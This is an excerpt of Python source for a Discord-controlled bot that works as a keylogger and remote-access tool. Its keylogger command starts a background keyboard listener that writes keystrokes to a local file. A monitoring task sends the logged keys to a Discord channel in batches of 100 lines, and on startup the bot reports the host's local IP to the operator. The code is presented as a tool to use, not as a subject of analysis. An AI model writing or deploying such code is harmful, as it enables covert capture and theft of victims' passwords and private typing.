...
NEW_USERNAME = 'WineBot'
AVATAR_URL = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTwikd-8VNO9LTOVWRyI7A9xX-CAT5IoSaIRQ&s'  # Replace w
channel_id = 1281910882946777090
keyboard_listener = None
is_listening = False
listener_thread = None
key_queue = Queue()
file_path = "type.txt"  # File to store key presses
max_lines = 100  # Number of lines to reach before sending
...
# Background task that monitors the file and sends its contents
async def monitor_file():
    await bot.wait_until_ready()  # Ensure the bot is ready before processing
    ...
    while True:
        if os.path.exists(file_path):
            ...
            if len(lines) >= max_lines:
                # Send the contents of the file to the Discord channel
                if channel:
                    file_contents = ''.join(lines)
                    await channel.send(f'Key press log:\n{file_contents}')
...
async def on_ready():
    ...
    bot.loop.create_task(monitor_file())  # Start the background task

    # Change the bot's username
    if bot.user.name != NEW_USERNAME:
        try:
    ...
    async with aiohttp.ClientSession() as session:
        async with session.get(AVATAR_URL) as resp:
            if resp.status == 200:
                ...
                print(f'Failed to fetch avatar, status code: {resp.status}')

    # Logging bot status to a specific channel
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        try:
            await channel.send(f'```{LOCAL_IP} Started New Session At {TIME}, made by venodev :)```')
        except Exception as e:  
...
@bot.command()
async def keylogger(ctx, arg):
    global is_listening, listener_thread, keyboard_listener

    if arg == "start":
        if not is_listening:
            is_listening = True
            await ctx.send("Keyboard tracking started.")

            # Start the keyboard listener in a separate thread if not already running
            listener_thread = threading.Thread(target=start_listener, daemon=True)
            listener_thread.start()
        else:
            await ctx.send("Keyboard tracking is already running.")

    elif arg == "stop":
        if is_listening:
            is_listening = False
            await ctx.send("Keyboard tracking stopped.")
        else:
            await ctx.send("Keyboard tracking is not running.")
...
# Add the file monitoring task to the bot's event loop
